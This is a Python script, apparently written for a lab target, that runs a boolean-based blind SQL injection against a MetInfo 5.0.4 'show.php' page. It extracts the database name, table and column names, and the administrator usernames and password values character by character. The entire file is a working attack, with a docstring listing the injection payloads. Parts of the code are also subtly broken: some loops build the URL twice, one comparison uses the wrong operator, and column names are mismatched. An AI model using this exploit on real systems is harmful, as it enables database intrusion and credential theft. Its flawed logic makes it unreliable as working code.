import requests
import string

"""
 and length(database())>1
 and ascii(substr(database(),1,1))>1
 and ascii(substr((select concat(admin_name,0x3a,admin_pass) from met_admin_table),1,1))>1
 and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>0
 and length((select concat(admin_id,0x3a,admin_pass) from met_admin_table))>0
 and ascii(substr(select concat(admin_id,0x3a,admin_pass) from met_admin_table))>0
 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65),1,1))>1
"""

url = "http://10.9.69.249/MetInfo5.0.4/about/show.php?lang=cn&id=22"

char_s = string.printable.strip()

for i in range(1,1001):
    payload1 = f"{url} and length(database())={i}"
    full_url = url + payload1
    print(f"[*] 正在测试内容的长度为 {i}")

    if "location.href='../404.html'" not in requests.get(url = full_url).text:
        cont_long = i
        break

print(f"\033[32m[+] 测试内容的长度为 {cont_long}\033[0m")

cont = ""

for i in range(1, cont_long + 1):
    for j in char_s:
        payload1 = f" and ascii(substr(database(),{i},1))={ord(j)}"
        full_url = url + payload1


        if "location.href='../404.html'" not in requests.get(url = full_url).text:
            cont += j
            print(f"[*] 正在测试数据库表内容的第 {i} 位为 {j}")

            break

print(f"\033[32m[+] 测试内容为 {cont}\033[0m")


for i in range(1,1001):
    payload = f"{url} and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={i}"
    full_url = url + payload
    print(f"[*] 正在测试数据库表内容的长度为 {i}")

    if "location.href='../404.html'" not in requests.get(url = full_url).text:
        cont_long = i
        break

print(f"\033[32m[+] 测试数据库表内容的长度为 {cont_long}\033[0m")

cont = ""

for i in range(1, cont_long + 1):
    for j in char_s:
        payload = f" and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))={ord(j)}"
        full_url = url + payload


        if "location.href='../404.html'" not in requests.get(url = full_url).text:
            cont += j
            print(f"[*] 正在测试数据库表内容的第 {i} 位为 {j}")

            break

print(f"\033[32m[+] 测试数据库表内容为 {cont}\033[0m")



for i in range(1,1001):
    payload = f"{url} and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65))={i}"
    full_url = url + payload
    print(f"[*] 正在测试数据库表中内容的长度为 {i}")

    if "location.href='../404.html'" not in requests.get(url = full_url).text:
        cont_long = i
        break

print(f"\033[32m[+] 测试数据库表中列的长度为 {cont_long}\033[0m")

cont = ""

for i in range(1, cont_long + 1):
    for j in char_s:
        payload = f" and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65),{i},1))={ord(j)}"
        full_url = url + payload

        if "location.href='../404.html'" not in requests.get(url = full_url).text:
            cont += j
            print(f"[*] 正在测试数据库表中内容的第 {i} 位为 {j}")

            break

print(f"\033[32m[+] 测试数据库表中列为 {cont}\033[0m")





for i in range(1,1001):
    payload = f"{url} and length((select concat(admin_id,0x3a,admin_pass) from met_admin_table))={i}"
    full_url = url + payload
    print(f"[*] 正在测试数据库表中内容的长度为 {i}")

    if "location.href='../404.html'" not in requests.get(url = full_url).text:
        cont_long = i
        break

print(f"\033[32m[+] 测试数据库表中内容的长度为 {cont_long}\033[0m")

cont = ""

for i in range(1, cont_long + 1):
    for j in char_s:
        payload = f" and ascii(substr((select concat(admin_name,0x3a,admin_pass) from met_admin_table),{i},1))>{ord(j)}"
        full_url = url + payload

        if "location.href='../404.html'" not in requests.get(url = full_url).text:
            cont += j
            print(f"[*] 正在测试数据库表中内容的第 {i} 位为 {j}")

            break

print(f"\033[32m[+] 测试数据库表中内容为 {cont}\033[0m")
